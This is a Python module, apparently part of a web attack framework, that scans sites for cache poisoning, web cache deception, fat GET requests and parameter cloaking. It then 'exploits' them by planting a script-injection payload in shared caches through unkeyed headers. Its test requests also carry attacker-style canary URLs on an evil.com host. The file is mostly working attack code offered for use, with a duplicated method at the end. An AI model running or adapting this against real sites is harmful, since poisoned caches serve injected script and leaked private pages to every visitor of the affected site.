import re
import asyncio
from typing import Dict, List, Set, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from modules.base import BaseModule
from core.utils import random_string


class CachepoisModule(BaseModule):
    name = "cachepois"
    description = "Web Cache Poisoning Scanner"
    exploitable = True
    
    unkeyed_headers = [
        "X-Forwarded-Host",
        "X-Host",
        "X-Forwarded-Server",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Forwarded-Scheme",
        "X-Forwarded-Proto",
        "X-Original-Host",
        "X-HTTP-Method-Override",
        "X-Forwarded-Port",
        "X-Amz-Website-Redirect-Location",
        "X-Original-Url",
        "Origin",
        "Pragma",
        "Cache-Control",
        "Accept-Language",
        "Accept-Encoding",
        "Accept",
        "Cookie",
        "Range",
        "User-Agent",
    ]
    
    unkeyed_params = [
        "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
        "ref", "referrer", "source", "origin", "callback", "jsonp",
        "_", "__", "cachebuster", "cb", "timestamp", "t", "time",
        "nocache", "rand", "random", "v", "ver", "version",
        "debug", "test", "dev", "preview", "draft",
    ]
    
    path_variations = [
        "/{path}",
        "/{path}/",
        "/{path}?",
        "/{path}#",
        "/{path};",
        "/{path}/..",
        "/{path}/../{path}",
        "//{path}",
        "/.{path}",
        "/{path}%00",
        "/{path}%20",
        "/{path}%0d%0a",
        "/{path}.css",
        "/{path}.js",
        "/{path}.ico",
        "/{path}/..;/",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.poisonable_endpoints: List[Dict] = []
        self.tested_params: Set[str] = set()
        self.cache_key_parts: Optional[List[str]] = None
        
        base_url = urljoin(target, "/")
        
        await self._detect_caching(base_url)
        await self._test_unkeyed_headers(base_url)
        await self._test_unkeyed_params(base_url)
        await self._test_path_normalization(base_url)
        await self._test_web_cache_deception(base_url)
        await self._test_fat_get(base_url)
        await self._test_parameter_cloaking(base_url)
        
        return self.findings
    
    async def _detect_caching(self, target: str):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
        
        cache_indicators = {
            "x-cache": headers.get("x-cache", ""),
            "x-cache-status": headers.get("x-cache-status", ""),
            "cf-cache-status": headers.get("cf-cache-status", ""),
            "x-varnish": headers.get("x-varnish", ""),
            "x-drupal-cache": headers.get("x-drupal-cache", ""),
            "x-proxy-cache": headers.get("x-proxy-cache", ""),
            "x-rack-cache": headers.get("x-rack-cache", ""),
            "x-aspnet-cached": headers.get("x-aspnet-cached", ""),
            "age": headers.get("age", ""),
            "cache-control": headers.get("cache-control", ""),
            "cdn-cache-control": headers.get("cdn-cache-control", ""),
            "surrogate-control": headers.get("surrogate-control", ""),
        }
        
        cached = False
        for header, value in cache_indicators.items():
            if value:
                if "hit" in value.lower() or "cached" in value.lower():
                    cached = True
                    break
        
        if cached or headers.get("age"):
            self.log_info(f"Caching detected: {[k for k, v in cache_indicators.items() if v]}")
        else:
            self.log_info("No obvious caching detected, testing anyway...")
    
    async def _test_unkeyed_headers(self, target: str):
        canary = random_string(12)
        
        for header in self.unkeyed_headers:
            cache_buster = random_string(8)
            test_url = f"{target}?cb={cache_buster}"
            
            resp1 = await self.http.get(test_url, headers={header: f"https://{canary}.evil.com"})
            
            if not resp1.get("status"):
                continue
            
            text1 = resp1.get("text", "")
            
            if canary in text1:
                await asyncio.sleep(1)
                
                resp2 = await self.http.get(test_url)
                text2 = resp2.get("text", "")
                
                if canary in text2:
                    self.add_finding(
                        "CRITICAL",
                        f"Cache Poisoning via Unkeyed Header: {header}",
                        url=test_url,
                        evidence=f"Poisoned value persisted in cache"
                    )
                    
                    self.poisonable_endpoints.append({
                        "type": "unkeyed_header",
                        "header": header,
                        "payload": f"https://{canary}.evil.com",
                    })
                    
                    self.record_success(header, target)
                else:
                    self.add_finding(
                        "HIGH",
                        f"Unkeyed Header Reflected: {header}",
                        url=test_url,
                        evidence="Header value reflected but not cached (or short TTL)"
                    )
    
    async def _test_unkeyed_params(self, target: str):
        canary = random_string(12)
        
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in self.unkeyed_params[:15]:
            cache_buster = random_string(8)
            test_url = f"{base_url}?legit=1&cb={cache_buster}"
            poison_url = f"{test_url}&{param}=https://{canary}.evil.com"
            
            resp1 = await self.http.get(poison_url)
            
            if not resp1.get("status"):
                continue
            
            text1 = resp1.get("text", "")
            
            if canary in text1:
                await asyncio.sleep(1)
                
                resp2 = await self.http.get(test_url)
                text2 = resp2.get("text", "")
                
                if canary in text2:
                    self.add_finding(
                        "CRITICAL",
                        f"Cache Poisoning via Unkeyed Parameter: {param}",
                        url=poison_url,
                        evidence="Unkeyed parameter value cached"
                    )
                    
                    self.poisonable_endpoints.append({
                        "type": "unkeyed_param",
                        "param": param,
                    })
    
    async def _test_path_normalization(self, target: str):
        parsed = urlparse(target)
        path = parsed.path or "/"
        
        canary = random_string(12)
        
        for variation in self.path_variations[:10]:
            test_path = variation.replace("{path}", path.strip("/"))
            test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
            
            try:
                resp = await self.http.get(test_url)
                
                if resp.get("status") == 200:
                    headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                    
                    if "hit" in headers.get("x-cache", "").lower():
                        self.add_finding(
                            "HIGH",
                            "Path Normalization Cache Poisoning",
                            url=test_url,
                            evidence=f"Normalized path cached: {variation}"
                        )
                        
                        self.poisonable_endpoints.append({
                            "type": "path_normalization",
                            "variation": variation,
                        })
                        break
            except:
                pass
    
    async def _test_web_cache_deception(self, target: str):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        static_extensions = [".css", ".js", ".jpg", ".png", ".gif", ".ico", ".svg", ".woff"]
        
        deception_paths = [
            f"{parsed.path}/nonexistent.css",
            f"{parsed.path}/test.js",
            f"{parsed.path}/../{parsed.path.split('/')[-1]}.css",
            f"{parsed.path}/..%2fstatic.css",
            f"{parsed.path};/static.css",
            f"{parsed.path}%0astatic.css",
        ]
        
        for path in deception_paths:
            test_url = f"{base}{path}"
            
            try:
                resp = await self.http.get(test_url)
                
                if resp.get("status") == 200:
                    text = resp.get("text", "")
                    headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                    
                    if "hit" in headers.get("x-cache", "").lower():
                        sensitive_patterns = [
                            r"email", r"password", r"token", r"session",
                            r"user", r"account", r"balance", r"credit",
                        ]
                        
                        for pattern in sensitive_patterns:
                            if re.search(pattern, text, re.I):
                                self.add_finding(
                                    "CRITICAL",
                                    "Web Cache Deception",
                                    url=test_url,
                                    evidence=f"Sensitive data cached via static extension: {path}"
                                )
                                
                                self.poisonable_endpoints.append({
                                    "type": "cache_deception",
                                    "path": path,
                                })
                                return
            except:
                pass
    
    async def _test_fat_get(self, target: str):
        canary = random_string(12)
        
        cache_buster = random_string(8)
        test_url = f"{target}?cb={cache_buster}"
        
        try:
            resp = await self.http.request(
                "GET",
                test_url,
                data={"evil": canary},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if resp.get("status"):
                text = resp.get("text", "")
                
                if canary in text:
                    self.add_finding(
                        "HIGH",
                        "Fat GET Request Accepted",
                        url=test_url,
                        evidence="GET request with body processed"
                    )
                    
                    self.poisonable_endpoints.append({
                        "type": "fat_get",
                    })
        except:
            pass
    
    async def _test_parameter_cloaking(self, target: str):
        canary = random_string(12)
        
        cloaking_techniques = [
            f"test=1;evil={canary}",
            f"test=1%26evil={canary}",
            f"test=1%0aevil={canary}",
            f"test=1%0devil={canary}",
            f"test[0]=1&test[1]={canary}",
        ]
        
        for technique in cloaking_techniques:
            cache_buster = random_string(8)
            test_url = f"{target}?{technique}&cb={cache_buster}"
            
            try:
                resp = await self.http.get(test_url)
                
                if resp.get("status") and canary in resp.get("text", ""):
                    self.add_finding(
                        "HIGH",
                        "Parameter Cloaking Possible",
                        url=test_url,
                        evidence=f"Cloaked parameter reflected: {technique[:30]}..."
                    )
                    
                    self.poisonable_endpoints.append({
                        "type": "param_cloaking",
                        "technique": technique,
                    })
                    break
            except:
                pass
    
    async def exploit(self, target, finding):
        results = {
            "poisoned_urls": [],
        }
        
        for endpoint in self.poisonable_endpoints:
            if endpoint["type"] == "unkeyed_header":
                xss_payload = "<script>alert(document.domain)</script>"
                
                cache_buster = random_string(8)
                poison_url = f"{target}?cb={cache_buster}"
                
                await self.http.get(
                    poison_url,
                    headers={endpoint["header"]: xss_payload}
                )
                
                await asyncio.sleep(2)
                
                resp = await self.http.get(poison_url)
                
                if resp.get("status") and xss_payload in resp.get("text", ""):
                    results["poisoned_urls"].append({
                        "url": poison_url,
                        "header": endpoint["header"],
                        "payload": xss_payload,
                        "persistent": True,
                    })
                    
                    self.add_exploit_data("cache_xss", {
                        "url": poison_url,
                        "payload": xss_payload,
                    })
        
        return results
    
    def get_poisonable_endpoints(self) -> List[Dict]:
        return self.poisonable_endpoints
    
    def analyze_cache_key(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return {
            "path": parsed.path,
            "params": urlencode(query_params, doseq=True) if query_params else "",
            "fragment": parsed.fragment,
        }
    
    def analyze_cache_key(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        return {
            "path": parsed.path,
            "params": urlencode(query_params, doseq=True) if query_params else "",
            "fragment": parsed.fragment,
        }